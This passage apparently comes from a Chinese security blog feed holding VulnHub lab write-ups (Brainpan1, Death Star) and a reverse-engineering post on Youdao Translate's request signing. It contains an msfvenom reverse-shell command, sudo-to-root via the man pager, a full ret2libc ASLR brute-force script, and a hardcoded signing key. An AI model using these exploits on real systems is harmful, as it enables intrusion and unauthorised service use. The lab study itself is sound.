src="/../img/vulnhub-Brainpan1.md/31.png"></p><h4 id="构造-ESP-的-shellcode"><a href="#构造-ESP-的-shellcode" class="headerlink" title="构造 ESP 的 shellcode"></a>构造 ESP 的 shellcode</h4><p>Msfvenom（教程：<a href="https://blog.csdn.net/qq_48985780/article/details/121441548">https://blog.csdn.net/qq_48985780&#x2F;article&#x2F;details&#x2F;121441548</a>）</p><p>-p 指定要使用的 payload</p><p>-b 设定坏字节</p><p>-e 指定编码器：shikata_ga_nai（绕过和免杀效果好。）</p><p>-f c 指定输出格式为 c 代码</p><p>LHOST 要写 kali 的 ip 地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">┌──(kali㉿kali)-[~/VulnHub/Brainpan1]<br>└─$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.169.17.136 LPORT=443 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f c<br><br></code></pre></td></tr></table></figure><p>构造 exp：</p><p><img src="/../img/vulnhub-Brainpan1.md/32.png"></p><p>最终 exp</p><p><img src="/../img/vulnhub-Brainpan1.md/33.png"></p><h3 id="windows-获取反弹-shell"><a href="#windows-获取反弹-shell" class="headerlink" title="windows 获取反弹 shell"></a>windows 获取反弹 shell</h3><p>kali：sudo nc -lvnp 443 开启监听</p><p>windows：运行 brainpan.exe 程序</p><p>kali：发送 exp</p><p>成功 getshell！</p><p><img src="/../img/vulnhub-Brainpan1.md/34.png"></p><h2 id="brainpan-ova"><a href="#brainpan-ova" class="headerlink" title="brainpan.ova"></a>brainpan.ova</h2><p>linux 系统</p><p>ip：192.168.17.144</p><p>生成 linux 的 payload（这个程序运行之后是通过 9999 端口交互的，并且基于内存的利用都是通用的，可以忽略操作系统的概念，还有别的巴拉巴拉….）</p><p><img src="/../img/vulnhub-Brainpan1.md/35.png"></p><p>针对靶机的 exp：</p><p><img src="/../img/vulnhub-Brainpan1.md/36.png"></p><h3 id="成功反弹-shell（低权限）！"><a href="#成功反弹-shell（低权限）！" class="headerlink" title="成功反弹 shell（低权限）！"></a>成功反弹 shell（低权限）！</h3><p><img src="/../img/vulnhub-Brainpan1.md/37.png"></p><p>美化 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;<br></code></pre></td></tr></table></figure><p><img src="/../img/vulnhub-Brainpan1.md/38.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br><br>puck@brainpan:/home/puck$ sudo -l<br>sudo -l<br>Matching Defaults entries for puck on this host:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User puck may run the following commands on this host:<br>    (root) NOPASSWD: /home/anansi/bin/anansi_util<br>    <br>puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util<br>sudo /home/anansi/bin/anansi_util<br>Usage: /home/anansi/bin/anansi_util [action]<br>Where [action] is one of:<br>  - network<br>  - proclist<br>  - manual [command]<br><br><br>puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual ls    <br>sudo /home/anansi/bin/anansi_util manual ls<br>No manual entry for manual<br>WARNING: terminal is not fully functional<br>-  (press RETURN)<br>LS(1)                            User Commands                           LS(1)<br><br>NAME<br>       ls - list directory contents<br><br>SYNOPSIS<br>       ls [OPTION]... [FILE]...<br><br>DESCRIPTION<br>       List  information  about  the FILEs (the current directory by default).<br>       Sort entries alphabetically if none of -cftuvSUX nor --sort  is  speci‐<br>       fied.<br><br>       Mandatory  arguments  to  long  options are mandatory for short options<br>       too.<br><br>       -a, --all<br>              do not ignore entries starting with .<br><br>       -A, --almost-all<br>              do not list implied . and ..<br><br>       --author<br> Manual page ls(1) line 1 (press h for help or q to quit)!/bin/bash<br>!/bin/bash（经验！！！）<br><br>root@brainpan:/usr/share/man# <br><br>root@brainpan:/home/puck/web# ip -a<br>ip -a<br>Option &quot;-a&quot; is unknown, try &quot;ip -help&quot;.<br>root@brainpan:/home/puck/web# uname -a<br>uname -a<br>Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux<br>root@brainpan:/home/puck/web# <br><br><br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vulnhub靶场</tag>
      
      <tag>缓冲区溢出（构造 eip 指向 esp、 esp 构造 shellcode）</tag>
      
      <tag>vlum-nmap漏洞探测</tag>
      
      <tag>wfuzz目录爆破</tag>
      
      <tag>msf-pattern</tag>
      
      <tag>badchars坏字节</tag>
      
      <tag>Immunity Debugger -&gt;mona.py</tag>
      
      <tag>Msfvenom构造shellcode!/bin/bash（提权）</tag>
      
      <tag>ret2libc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub:deathstar_1</title>
    <link href="/2025/05/29/vulnhub-deathstar_1/"/>
    <url>/2025/05/29/vulnhub-deathstar_1/</url>
    
    <content type="html"><![CDATA[<p>网址：<a href="https://www.vulnhub.com/entry/death-star-1,477/">https://www.vulnhub.com/entry/death-star-1,477/</a></p><h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><h4 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h4><p><img src="/../img/vulnhub-deathstar_1.md/1.png"></p><p>解压压缩包。</p><p><img src="/../img/vulnhub-deathstar_1.md/2.png"></p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>在 Vmware 左上角“文件”–&gt;“打开”–&gt;选择“DeathStart_1.ovf”即可</p><p>启动虚拟机</p><p><img src="/../img/vulnhub-deathstar_1.md/3.png"></p><h1 id="攻入"><a href="#攻入" class="headerlink" title="攻入"></a>攻入</h1><h2 id="nmap-探测开放端口"><a href="#nmap-探测开放端口" class="headerlink" title="nmap 探测开放端口"></a>nmap 探测开放端口</h2><p>打开 kali，nmap 扫描网段，找到靶机 ip：192.168.17.254</p><p><img src="/../img/vulnhub-deathstar_1.md/4.png"></p><p>可以联通靶机</p><p><img src="/../img/vulnhub-deathstar_1.md/5.png"></p><p><strong>全端口扫描</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/6.png"></p><p>没有结果….</p><p><strong>添加-f 参数进行数据包分片</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/7.png"></p><p>没有结果….</p><p><strong>源端口伪装</strong></p><p>将源端口伪装成 dns</p><p><img src="/../img/vulnhub-deathstar_1.md/8.png"></p><p>没有结果….</p><p><strong>按顺序扫描（nmap 默认是随机扫描）</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/9.png"></p><p>没有结果….</p><p><strong>修改 TCP 标志</strong></p><p>猜测防火墙仅过滤特定的 syn 扫描，若使用 urg、psh、fin 这三个标志进行发送可能不过滤</p><p><img src="/../img/vulnhub-deathstar_1.md/10.png"></p><p>没有结果….</p><p><strong>测试 UDP</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/11.png"></p><p>仅开放&#x2F;过滤 dhcp，没什么用</p><p>至此 nmap 探测没有什么效果，尝试使用抓取网络流量</p><h2 id="网络流量抓取"><a href="#网络流量抓取" class="headerlink" title="网络流量抓取"></a>网络流量抓取</h2><p>查看网卡</p><p><img src="/../img/vulnhub-deathstar_1.md/12.png"></p><p>使用 tshark（tshark 就是 wires hark 的命令行版本）</p><p><img src="/../img/vulnhub-deathstar_1.md/13.png"></p><p><em><strong>发现：靶机每 60s 向外发送一次数据包</strong></em></p><p>__</p><p>查看截获的数据包：</p><p><img src="/../img/vulnhub-deathstar_1.md/14.png"></p><p>观察到数据包中的 ASCII 码，尝试提取</p><p><img src="/../img/vulnhub-deathstar_1.md/15.png"></p><p><img src="/../img/vulnhub-deathstar_1.md/16.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>xxd常用于调试、文件内容分析和数据转换，用来把文件或标准输入的文件转化成16进制或者二进制（－d参数）<br>-r：将十六进制数据还原为二进制（反向操作）。<br>-p：以连续的纯十六进制形式（不带偏移地址和 ASCII）输出。<br>-c cols：每行输出多少个字节，默认为 16。<br>-g bytes：每组显示多少字节，默认为 2。<br>-s offset：从文件的某个偏移位置开始读取（支持负数表示从文件末尾开始）。<br>-l length：只显示指定长度的字节。<br>-u：将输出的十六进制字符转为大写。<br>-i：以 C 语言的数组格式输出。<br>-b：将输出转换为二进制格式，而不是十六进制。<br></code></pre></td></tr></table></figure><p>将数据包中的 ASCII 提取，转译，得到以下提示内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>Code to access the Death Star Blueprint<br>within the time it takes to reload is:  DS-1@OBS     <br><br><br>Thanks to the successful Operation Skyhook, the Rebel Alliance<br>got some plans for the new weapon of the Galactic Empire. We<br>know that there is a small opening that we can explore through a<br>thermal exhaust that is directly connected to the Main Reactor of the<br>Death Star. The superlaser takes 1440 minutes to reload.<br>It is very important to observe &#x27;this window&#x27; in order to recover the blueprint.<br>This is because, it is only possible to make an attempt every 60 seconds.<br><br>翻译：<br>访问死星蓝图的代码（需在重新装填时间内输入）：DS-1@OBS<br><br>得益于&quot;天钩行动&quot;的成功，义军同盟获得了银河帝国新式武器的部分设计图。我们已发现一个可通过热排气口进入的小型通道，该通道直通死星的主反应堆。超级激光炮需要1440分钟重新装填。<br>必须密切把握&quot;这个窗口期&quot;才能获取蓝图。<br>因为系统每60秒才允许尝试一次。<br></code></pre></td></tr></table></figure><h4 id="锁定-1440-端口"><a href="#锁定-1440-端口" class="headerlink" title="锁定 1440 端口"></a>锁定 1440 端口</h4><p>提示中提到了 1440 和 60，这俩可能是俩开放的端口，nmap 扫描</p><p><img src="/../img/vulnhub-deathstar_1.md/17.png"></p><p>nmap 成功扫描到了 1440 开放端口</p><h4 id="nc-连接"><a href="#nc-连接" class="headerlink" title="nc 连接"></a>nc 连接</h4><p><img src="/../img/vulnhub-deathstar_1.md/18.png"></p><p><strong>想到提示</strong>：访问死星蓝图的代码（需在重新装填时间内输入）：DS-1@OBS</p><p>echo “DS-1@OBS” | nc -u 192.168.17.143 1440 | tee mass</p><p><img src="/../img/vulnhub-deathstar_1.md/19.png"></p><h4 id="对-mass-分析"><a href="#对-mass-分析" class="headerlink" title="对 mass 分析"></a>对 mass 分析</h4><p>看起来像 base64 </p><p><img src="/../img/vulnhub-deathstar_1.md/20.png"></p><p>打开图像（open x）</p><p><img src="/../img/vulnhub-deathstar_1.md/21.png"></p><h2 id="对-Blueprint-图进行分析"><a href="#对-Blueprint-图进行分析" class="headerlink" title="对 Blueprint 图进行分析"></a>对 Blueprint 图进行分析</h2><h4 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h4><p>steghide（一款强大的隐写术工具<a href="https://labex.io/zh/tutorials/hide-data-in-steghide-549941">https://labex.io/zh/tutorials/hide-data-in-steghide-549941</a>）</p><p><img src="/../img/vulnhub-deathstar_1.md/22.png"></p><p><strong>解锁码的每个分段必须由3个字符组成，按顺序发送方可开启10110端口。</strong></p><h2 id="端口敲门"><a href="#端口敲门" class="headerlink" title="端口敲门"></a>端口敲门</h2><p>nmap 查看 10110 端口的状态</p><p><img src="/../img/vulnhub-deathstar_1.md/23.png"></p><p>过滤态</p><h4 id="knock"><a href="#knock" class="headerlink" title="knock"></a>knock</h4><p><img src="/../img/vulnhub-deathstar_1.md/24.png"></p><p>查看 10110 端口的服务信息</p><p><img src="/../img/vulnhub-deathstar_1.md/25.png"></p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p><img src="/../img/vulnhub-deathstar_1.md/26.png"></p><p>问 ChatGpt，得到密码：lyra13</p><p><img src="/../img/vulnhub-deathstar_1.md/27.png"></p><p>有提示：</p><p><img src="/../img/vulnhub-deathstar_1.md/28.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>来自盖伦·厄索的讯息：<br><br>这是你的机会。摧毁银河帝国的计划。我知道维达勋爵绝不会乐见此事。但，这将是我赎罪的机会。希望你们掌握足够的知识来协助摧毁这件新武器。<br><br>探索系统并获取&quot;root权限&quot;，读取位于&quot;/root/message.txt&quot;的秘密信息。<br><br>不成功便成仁！！<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>列出系统中所有设置了 SUID 或 SGID 权限的可执行文件。</p><p><img src="/../img/vulnhub-deathstar_1.md/29.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/34357387/1748500125418-ac5135ae-cd2c-45bb-8bde-167776b2ca31.png"></p><h4 id="dartVader-分析"><a href="#dartVader-分析" class="headerlink" title="dartVader 分析"></a>dartVader 分析</h4><p>查看&#x2F;bin&#x2F;dartVader</p><p><img src="/../img/vulnhub-deathstar_1.md/30.png"></p><p><img src="/../img/vulnhub-deathstar_1.md/31.png"></p><p>提示：dartVader: 你在这里有未来。别当个菜鸟，去真正寻找并学习…</p><p><img src="/../img/vulnhub-deathstar_1.md/32.png"></p><p>查看包含字符串：</p><p><img src="/../img/vulnhub-deathstar_1.md/33.png"></p><p>该文件是一个 elf 文件，将文件提取到 kali</p><p>scp -P 10110 <a href="mailto:&#x65;&#x72;&#x73;&#111;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#49;&#55;&#x2e;&#49;&#x34;&#x33;">erso@192.168.17.143</a>:&#x2F;bin&#x2F;dartVader .</p><p>使用 kali 中 gdb 和 gdb-peda</p><p><img src="/../img/vulnhub-deathstar_1.md/34.png"></p><p><strong>开启了 NX 保护</strong>(checksec 讲解：<a href="https://bbs.kanxue.com/thread-250538.htm">https://bbs.kanxue.com/thread-250538.htm</a>)</p><p>反汇编 main 函数：</p><p><img src="/../img/vulnhub-deathstar_1.md/35.png"></p><p><strong>发现使用了不安全的反汇编函数 strcpy，而且没有验证长度！</strong></p><h4 id="测试是否存在缓冲区溢出漏洞"><a href="#测试是否存在缓冲区溢出漏洞" class="headerlink" title="测试是否存在缓冲区溢出漏洞"></a>测试是否存在缓冲区溢出漏洞</h4><p><img src="/../img/vulnhub-deathstar_1.md/36.png"></p><p>没有输出</p><p>搜索靶机是否有 python 环境</p><p><img src="/../img/vulnhub-deathstar_1.md/37.png"></p><p>当命令行输入 100 个 A 时候，触发报错：</p><p><img src="/../img/vulnhub-deathstar_1.md/38.png"></p><p>查看日志</p><p><img src="/../img/vulnhub-deathstar_1.md/39.png"></p><p>确定 sp 寄存器的地址：bff03670</p><p><strong>根据 41414141 确定存在缓冲区溢出漏洞</strong></p><hr><p><strong>readelf 查看文件详情（scanelf -e dartVader 也可以）</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/40.png"></p><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p><img src="/../img/vulnhub-deathstar_1.md/41.png"></p><h5 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h5><p>可以看到每一次地址都是变化的，确认存在 ASLR，但是变化的地址都离的很近</p><p><img src="/../img/vulnhub-deathstar_1.md/42.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">地址空间布局随机化（ASLR）可以帮助克服某些类型的缓冲区溢出攻击，ASLR可以将基数，库，堆和堆栈放在进程地址空间中的任意随机位置，这使攻击程序很难预测下一条指令的内存地址。<br>ASLR内置在Linux内核中，并由参数控制 /proc/sys/kernel/randomize_va_space,该 randomize_va_space参数可以采用以下值：<br>  0 : 禁用ASLR。如果使用norandmapsboot参数引导内核，则将应用此设置。<br>  1 : 随机化堆栈，虚拟动态共享对象（VDSO）页面和共享内存区域的位置。数据段的基地址位于可执行代码段的结尾之后。<br>  2 : 随机化堆栈，VDSO页，共享内存区域和数据段的位置。这是默认设置。<br></code></pre></td></tr></table></figure><p><img src="/../img/vulnhub-deathstar_1.md/43.png"></p><p>看看当前用户可否关闭 ASLR</p><p><img src="/../img/vulnhub-deathstar_1.md/44.png"></p><h6 id="绕过-ASLR"><a href="#绕过-ASLR" class="headerlink" title="绕过 ASLR"></a>绕过 ASLR</h6><p>撞 ASLR 地址，为什么撞？因为该 elf 程序是 32 位的，可以在使用更复杂的方法之前尝试一下</p><p><strong>找偏移地址：</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/45.png"></p><p><img src="/../img/vulnhub-deathstar_1.md/46.png"></p><p>libc 地址：0xb7603000</p><p>exit@@GLIBC_2.0 地址：00033260</p><p>system@@GLIBC_2.0 地址：00040310</p><p>使用 sh 不用 bash，找 sh 的地址：（防止因 bash 的安全机制拿不到 shell）</p><p><img src="/../img/vulnhub-deathstar_1.md/47.png"></p><h3 id="总结利用逻辑"><a href="#总结利用逻辑" class="headerlink" title="总结利用逻辑"></a>总结利用逻辑</h3><p>发现 dartVader 是一个由 <strong>root</strong> 拥有的二进制文件，初步简单<strong>交互无法实现提权</strong>；</p><p>通过<strong>反编译</strong>分析，观察到程序中存在<strong>缓冲区溢出漏洞（strcpy）</strong>，因为程序开启了 NX 保护，栈区不可执行 shellcode；</p><p>通过** ldd <strong>发现了程序链接了 libc 动态链接库，尝试使用</strong> ret2libc 攻击**，通过<strong>调用库中已有的函数 system，绕过程序的 nx 保护；</strong></p><p>但是目标环境启用了 <strong>ASLR</strong>，导致内存地址随机化，但是地址变化范围较小，尝试使用<strong>碰撞</strong>地址，绕过 ASLR；</p><p>通过构造 <strong>rop 链</strong>并循环猜测出 system 函数的地址，然后<strong>在 system 函数中执行 shell 命令</strong>，试图提权；</p><p>通过推测 libc 的基地址和 system 等函数的偏移关系，然后利用这一关系在循环中复现正确的内存布局，尝试命中目标地址。</p><h4 id="地址碰撞"><a href="#地址碰撞" class="headerlink" title="地址碰撞"></a>地址碰撞</h4><p><img src="/../img/vulnhub-deathstar_1.md/48.png"></p><p>锁定偏移为 76</p><p>最终 ret2libc.py 脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!/usr/bin/env python3<br># -*- coding:utf-8 -*-<br>from struct import pack<br>from subprocess import call<br><br>offset = b&quot;A&quot; * 76<br>libc = 0xb7603000<br>system = pack(&quot;&lt;I&quot;,libc + 0x00040310)<br>exit = pack(&quot;&lt;I&quot;,libc + 0x00033260)<br>sh = pack(&quot;&lt;I&quot;,libc + 0x162d4c)<br>buffer  = offset + system + exit + sh<br>app = b&quot;/bin/dartVader&quot;<br><br>for i in range(1024):<br>    print(&quot;Attempt %d&quot; % i)<br>    ret = call ([app,buffer])<br>    if ret == 0:<br>        print(&quot;Exploit Successful!&quot;)<br>        break<br>else:<br>    print(&quot;Mission failed&quot;)<br>    <br></code></pre></td></tr></table></figure><p>碰撞地址过程：</p><p><img src="/../img/vulnhub-deathstar_1.md/49.png"></p><p>成功 get root！</p><p><img src="/../img/vulnhub-deathstar_1.md/50.png"></p><p>查看&#x2F;root&#x2F;message.txt 文件</p><p><img src="/../img/vulnhub-deathstar_1.md/51.png"></p><p>Congratulations！！</p><p>参考：</p><p>红队笔记（讲的很好）：<a href="https://www.bilibili.com/video/BV1c8EEznEkv?spm_id_from=333.788.videopod.sections&vd_source=4e9106e7030f1c25677827558da5c605">https://www.bilibili.com/video/BV1c8EEznEkv?spm_id_from&#x3D;333.788.videopod.sections&amp;vd_source&#x3D;4e9106e7030f1c25677827558da5c605</a></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vulnhub靶场</tag>
      
      <tag>ret2libc</tag>
      
      <tag>图片隐写</tag>
      
      <tag>端口敲门</tag>
      
      <tag>ASLR绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某道逆向（翻译软件）</title>
    <link href="/2025/05/26/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91/"/>
    <url>/2025/05/26/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<p>目标：<a href="https://fanyi.youdao.com/#/TextTranslate">https://fanyi.youdao.com/#/TextTranslate</a></p><h3 id="Pawto">开始分析</h3>抓取得三个包，可看出来是 aes 加密<p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/1.png"></p><p>sign 和时间戳是变化的</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/2.png"></p><h3 id="LTkUz">逆sign</h3><h4 id="QQ0to">1. 搜索 sign</h4><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/3.png"></p><p>根据数据包中的 sign 周围的变量来定位 sign，若断点打不到本行就不是，接着往下找</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/4.png"></p><p>再次翻译，成功断到此处</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/5.png"></p><h4 id="BxQQJ">2.sign(a,e)</h4>a 为：a = (new Date).getTime();<p>e 不知道是什么</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/6.png"></p><p>运行后 e 出了新结果</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/7.png"></p><p>说明 sign(a,e)函数会运行两次</p><p>查看网络中的 sign</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/8.png"></p><p>看最终使用的是第一次的 sign 还是第二次的。</p><p>S 函数</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/9.png"></p><p>通过对 1 进行加密判断加密模式是不是 md5</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/10.png"></p><p>client、product、key 的值是固定的</p><h4 id="JOGSR">sign 解密代码</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">CryptoJs</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto-js&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getsign</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">const</span> a = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>).<span class="hljs-title function_">getTime</span>();<br><br>    test = <span class="hljs-string">`client=fanyideskweb&amp;mysticTime=<span class="hljs-subst">$&#123;a&#125;</span>&amp;product=webfanyi&amp;key=Vy4EQ1uwPkUoqvcP1nIu6WiAjxFeA3Y3`</span><br>    sign = <span class="hljs-title class_">CryptoJs</span>.<span class="hljs-title class_">MD5</span>(test).<span class="hljs-title function_">toString</span>();<br>    <span class="hljs-keyword">return</span> [a,sign]<br><br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getsign</span>());<br><br></code></pre></td></tr></table></figure><h3 id="WPU0g">逆 webtranslate</h3><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/11.png"></p><p>看到一大串数据无从下手，三种可能：</p><p>JSON.parse</p><p>decrypt</p><p>join</p><p>:::</p><p>定位：</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/12.png"></p><p>da.A.decodeData(o, ha.A.state.text.decodeKey, ha.A.state.text.decodeIv)的结果已经是 json 字符串了</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/13.png"></p><p>分析 json 解密的函数</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/14.png"></p><p>传入 e   t   a 三个参数</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/15.png"></p><p>const o 和 n 为固定值</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/16.png"></p><p>目前 js 状态：</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/17.png"></p><p>arg 为 O 函数传入的 e</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/18.png"></p><h3 id="uBPVj">Py 脚本</h3><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/19.png"></p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/20.png"></p><h4 id="Lfn38">得到密文</h4><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/21.png"></p><p>运行 py 脚本，得到值（这个值是服务器传给客户端的密文）</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/22.png"></p><h4 id="nUGim">解密</h4><p>调用 js 的解密函数</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/23.png"></p><p>运行 py</p><p>终端就可以进行翻译了~</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">CryptoJs</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto-js&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getsign</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> a = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>).<span class="hljs-title 